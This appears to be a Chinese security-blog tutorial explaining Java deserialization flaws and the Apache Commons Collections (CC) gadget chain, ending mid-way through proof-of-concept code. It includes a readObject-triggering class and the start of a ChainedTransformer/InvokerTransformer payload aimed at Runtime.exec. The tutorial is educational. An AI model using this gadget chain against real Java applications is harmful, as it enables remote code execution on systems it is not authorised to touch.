---
title: JAVA反序列化漏洞与CC链
url: https://mp.weixin.qq.com/s/X8EX8pzXtNvEUcj5-AbXcA
source: Doonsec's feed
date: 2026-05-02
fetch_date: 2026-05-03T05:22:43.201409
---

# JAVA反序列化漏洞与CC链

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Shiamu7mxKIAaV9EGZJ4XRkibnjcbBfbKkRmzyTMNZ2ooAV655a1GLk0bY9F9cOJEz84ujtzxllO5JOgtibkJBs51iaW74rSmicXDPJdqibXSlbaQ/0?wx_fmt=jpeg)

# JAVA反序列化漏洞与CC链

原创

Lily
Lily

成渝Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKICKcHEUbjeSWlxrZErJqrryy7eUMCZtk0RZaxUNm0oLyRPGic8Y1ibnN7BPZhQqSzEe2R71BNoKYGMibfH79NNG7LE4Uaibx9KLokU/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKID7uUiarXdQI2mLhg0lWPK1ZTicgxdWjjL80dZhOt4sYopfXxKNHpYUh1F0ENWbxvOdiaw3ibnUUJRdMyia1T8yKSbQ62ibgzCvedDQ0/640?wx_fmt=gif&from=appmsg)

点击蓝字，关注我们

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIB1QH2aHMLCRauicfCldUibyOezMAD6Q6AicHT20NGLyVY2Bgd0ej2MyzcLtWicznjdE9zQRZGeGEQU7drNPwLm9ylsgpUXic5uh9xU/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIBTPd1UY2gJvdUYgex4ReHXNh1joftPEXic29MWdS6GKRCWqFHiaNyJAj7GoYHx8oT6948Tr51TzpVEZYyUR3pNrm3ibYFwibmpSgs/640?wx_fmt=gif&from=appmsg)

**序列化与反序列化**

Youth Day

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKICibrYGEQZGjBbiaPYllSY9H819IpD37rEtPhv34FpFx2TdV6t9TJcL2PgPeoFt72D3C5UKO7JbowDfeOh5veVwK9ricK1ThxbzNo/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIC9xXYvt3ZREsric7FWloYiaXiaoib2q7gIGNrztmseicacTgOOe1NOicaD96laqNuga4Cpf9jA16okm1wjRSSxVC61HXjs5CMm4HGrk/640?wx_fmt=gif&from=appmsg)

序列化(Serialization) 是将对象的状态信息转换为可以存储或传输的形式的过程。在Java中，这通常意味着将对象转换为字节流，以便可以将其保存到磁盘上或通过网络传输到另一个网络节点。

相反，反序列化(Deserialization) 是将已序列化的数据恢复为对象的过程。

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIBQA9kcicmfpOFRrndQRVp7hwsibKgbhF7oPmhoqjFvTDANcVEG0amLoSwh3pnsxJQK6SPYYNUheE0M8phzseJo321VLThIdCu2Y/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIBe0vYSQtFxz9kVWuX8OpE1pUPp21nxicAJwghrrGjqkJHJlkzlUSZ0YkrjQrd7Ub3RBpZpb0Bh0N6xC7GiaibZpktaB0Z40EckEs/640?wx_fmt=gif&from=appmsg)

**序列化过程**

Youth Day

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIAoJyibm9UHC7M4pvJJ5Fy91yITfgPhp4LByZzSnKb9Z7OqQwSrj3ZzqtaPAHIkwfib0G1FBnaKGs0KWbW3aG2FelE4fMorpqTdg/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKICpYg7vsDr4TkzfWv3avzU1uaGmRHLjGmmiaDjOTJKJVYjUgQnl332NvNibQt9CyIwtibGYXNcVRR49DIFf3MuV90Nc45aQOScSWA/640?wx_fmt=gif&from=appmsg)

为了能够序列化，一个类必须实现 java.io.Serializable 接口。

序列化过程涉及使用 java.io.Objectoutputstream 类。它包装了一个底层的 outputstream，比如 FileoutputStream，用于将序列化的对象数据写入文件或其他类型的流。

序列化数据可以存在：文件、Cookie、HTTP参数、请求体、消息队列、数据库中。

漏洞的核心动作是：

* 攻击者能控制这个序列化数据
* 程序在反序列化时行为被劫持

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIDMEpXpObZVJKUBkRduMr93ALZs0icuHRQOWc3CkribnTvqwsg8bcicCjpzvaDVlCiat1HZHJG4OMnjcMQU48PnfbDejicREpZmFq4Y/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKICEiaOhHBqibPWnucfoCcVKlR8MOWwsiaum897TZicyVlmX4BS3IaY2FFSOnTazNsuxLAgovvaTQR7z1VEibr9EQnUfIr2AeyicI76Hw/640?wx_fmt=gif&from=appmsg)

**CC链**

Youth Day

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIBBf7jjia79ohoyxCcHBiagxMq5PoYgsfaSe6Le2pnTIlrAhj93fY6tkJtIeNlJTKFcf5jL5MMEkCc5Wic7s44VMapOhDcTcSJZCI/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIDCmlFxRRUBxpibNUY0mEd2oqA2ayiaDj0JOoIp4dlcoDrftDMbXuiamtgYgltIUjHBZ1kdPYicFzwztSiambwFraicaiao1zuuUia5gd4/640?wx_fmt=gif&from=appmsg)

CC链是Apache Commons Collections反序列化漏洞利用链的简称，它涉及将可以执行命令的函数序列化为对象流并转化为文件流存储在文件中(如Runtime.getRuntime().exec("calc.exe”))，然后通过反序列化将文件流转化回对象流并执行反序列化。

这一过程的关键在于重写readObject()方法，并确保反序列化的参数可控，无论这些参数是对象流还是文件流。CC链的目的是为了绕过直接反序列化Runtime对象时遇到的错误，因为Runtime类没有实现Serializable接口。

通过CC链，可以将Runtime对象序列化，从而执行命令RCE。

Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具类。作为Apache开放项目的重要组件，Commons Collections被广泛的各种Java应用的开发。可以在Apache官网下载CC的jar文件和源代码，用于代码审计。

常见的CC攻击链有如下类型：

```
CommonsCollections1 => CC1链CommonsCollections2 => CC2链CommonsCollections5 => CC5链CommonsCollections6 => CC6链
```

以下链接可以下载CC链的jar包。

```
https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.2
```

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKID59G7zksuhlJu3mSlReuIqg1ozOAl4236mjmedV990vhib6icdJ2HjG1HKYDjqeDfIZMXPKbce0RlfJtKmSeaSDv0nHHeBZQlf8/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIBpicNZ6EddNPhAs1JhZvriaREXA4rneSy55a8a9GM6jSRJB1PHrmvcPVcHC2icI1Q5PRib9dDtVmvH10ryx5rrbRKDzCQQkkgSpiaA/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKICtXOTd6sEW7mIldVTAHICBlJE2ar3Viaew6PEqa2unpGqGrUwxWRRqc6LvP5m346n5l4VpFeJke9b55yZk0cwfCJczGuAvurTs/640?wx_fmt=gif&from=appmsg)

**CC链核心组件**

Youth Day

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIBfWGKLKO0XZTicHJhkSzo0d2jCf22hJnCEp3ZkYvzOWZAXmMC2c1ibffT6LSG1XFYjXricCXu2k1SgMQGz73PMyCRannXoLh5Esw/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIBMuticBibWWiacIaJhjic4db1bZlbjDB8FgzicAicricDoOk0FLwzS0UEst5X79GCGaB6OzD48X2TITff8icYgSqmdicnP5UmHvXDPjiaVc/640?wx_fmt=gif&from=appmsg)

Apache Commons Collections 中有一个特殊的接口，其中有一个实现该接口的类可以通过调用 Java 反射机制来调用任意函数InvokerTransformer。

#### Java 反射机制

| 能力 | 说明 |
| --- | --- |
| 判断类 | 对于任意一个类，能够判断一个对象所属的类 |
| 获取类信息 | 对于任意一个类，能够知道这个类的所有属性和方法 |
| 调用方法 | 对于任意一个对象，能够调用它的任意一个方法和属性 |

动态获取信息 + 动态调用方法 = Java 反射机制

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIA84PxnyyAZvgkbBUTax8lv1qysBX2x37f8olU2b0d0NCYuuU9P0q21AqQicBpGic1GEr69ar1UECDFgvbMialCtYaP8NkXPzv4k8/640?wx_fmt=gif&from=appmsg)

CC链漏洞利用

反序列化漏洞

**01**

第一步

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKICSFiaV1TaUu57iasp959Bsq2fXXt6vI15Mic9oRzuvcw9eCicqHaWK6AYhyA60qXPZaY3D8r380cc7yG8Libcm24eicSTzOYkU0eozw/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKICAbqLx8pVDaTau5fGaj6FXRUOnnzARHwlTeAyKa907UN5Ea7gY2eiasmviaibCn71OHVVkv9MOC45rHIZkDYWXN6hibcH3asibYFa0/640?wx_fmt=gif&from=appmsg)

创建SerObjRewrite.java（核心漏洞类），这个类在反序列化时会自动触发命令执行：

```
import java.io.Serializable;import java.util.Map;import java.util.Iterator;import java.util.Map.Entry;
public class SerObjRewrite implements Serializable {    private static final long serialVersionUID = 1L;    public Map<?, ?> map;    private void readObject(java.io.ObjectInputStream in) throws Exception {        in.defaultReadObject();        if (map != null && !map.isEmpty()) {            // 方法1：通过 entry setValue 触发            Iterator<?> iterator = map.entrySet().iterator();            if (iterator.hasNext()) {                @SuppressWarnings("rawtypes")                Map.Entry entry = (Map.Entry) iterator.next();                entry.setValue("rce");  // 触发 TransformedMap 的 checkSetValue            }            // 方法2：直接遍历所有 entry            // for (Object entry : map.entrySet()) {            //     ((Map.Entry) entry).setValue("rce");            // }        }    }}
```

**02**

第二步

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKICSFiaV1TaUu57iasp959Bsq2fXXt6vI15Mic9oRzuvcw9eCicqHaWK6AYhyA60qXPZaY3D8r380cc7yG8Libcm24eicSTzOYkU0eozw/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKICAbqLx8pVDaTau5fGaj6FXRUOnnzARHwlTeAyKa907UN5Ea7gY2eiasmviaibCn71OHVVkv9MOC45rHIZkDYWXN6hibcH3asibYFa0/640?wx_fmt=gif&from=appmsg)

创建DeSerPoc.java（构造恶意序列化对象）：

```
import java.io.*;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;public class DeSerPoc {    public static void main(String args[]) throws Exception {        // 命令执行链        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(Runtime.class),                new InvokerTransformer("getMethod", new Class[]{                        String.class, Class[].class}, new Object[]{                        "getRuntime", new Class[0]}),                new InvokerTransformer("invoke", new Class[]{                        Object.class, Object[].class}, new Object[]{                        null, new Object[0]}),       ...